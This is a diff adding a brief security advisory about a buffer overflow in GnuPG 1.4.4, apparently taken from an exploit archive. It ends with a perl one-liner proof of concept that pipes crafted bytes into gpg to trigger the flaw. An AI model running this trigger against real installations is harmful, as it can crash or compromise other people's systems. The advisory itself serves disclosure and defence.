@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/19110/info
+
+GnuPG is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
+
+This issue may allow remote attackers to execute arbitrary machine code in the context of the affected application, but this has not been confirmed.
+
+GnuPG version 1.4.4 is vulnerable to this issue; previous versions may also be affected.
+
+perl -e 'print "\xfd\xff\xff\xff\xff\xfe"'| /var/gnupg/bin/gpg --no-armor
